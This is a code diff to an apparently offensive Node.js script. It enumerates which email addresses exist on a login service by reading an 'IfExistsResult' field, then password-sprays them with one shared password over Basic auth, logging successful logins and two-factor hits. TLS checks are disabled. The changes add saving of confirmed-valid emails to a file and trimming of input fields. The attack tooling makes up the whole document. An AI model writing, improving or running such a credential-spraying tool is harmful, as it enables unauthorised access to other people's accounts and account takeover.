@@ -3,6 +3,8 @@ const request = require('request')
 const lineReader = require('line-reader');
 process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
 
+stream = fs.createWriteStream("valid_emails.txt", {flags:'a'});
+
 emails = []
 start_index = 0
 //temp value defined after parsing the file
@@ -27,7 +29,7 @@ function is_email_valid(email){
   if(mode == 2){
     is_password_valid(email)
   }else{
-    let bodyString = `{"Username":"${email}"}`
+    let bodyString = `{"Username":"${email.split(',')[0]}"}`
     
     let headers = {
         "Connection": "close", 
@@ -46,7 +48,8 @@ function is_email_valid(email){
     request(options, function (error, response, body) {
       let email_status = JSON.parse(body).IfExistsResult
       if(email_status == 0){
-        console.log(FgBlue, `[*] VALID_EMAIL: ${email}`)
+        console.log(FgBlue, `[*] VALID_EMAIL: ${email.split(',')[0]}`)
+        stream.write(email + "\n")
         if(mode == 1){
           threads -= 1
           thread_api()
@@ -54,7 +57,7 @@ function is_email_valid(email){
           is_password_valid(email)
         }
       }else{
-        console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email}`)
+        console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email.split(',')[0]}`)
         threads -= 1
         thread_api()
       }
@@ -63,7 +66,7 @@ function is_email_valid(email){
 }
 
 function is_password_valid(email){
-  let userpass =  `${email}:${pass}` 
+  let userpass =  `${email.split(',')[0]}:${pass}` 
   let encoded = Buffer.from(userpass).toString('base64')
   let headers = {
       "Connection": "close", 
@@ -82,11 +85,11 @@ function is_password_valid(email){
   }
   request(options, function (error, response, body) {
     if(response.statusCode == 403){
-      console.log(FgGreen, `[+] SUCCESS (But 2FA): ${email}:${pass}`)
+      console.log(FgGreen, `[+] SUCCESS (But 2FA): ${email.split(',')[0]}:${pass}`)
     }else if(response.statusCode == 200){
-      console.log(FgGreen, `[+] SUCCESS: ${email}:${pass}`)
+      console.log(FgGreen, `[+] SUCCESS: ${email.split(',')[0]}:${pass}`)
     }else{
-      console.log(FgRed, `[-] fail: ${email}:${pass}`)
+      console.log(FgRed, `[-] fail: ${email.split(',')[0]}:${pass}`)
     }
     threads -= 1
     thread_api()
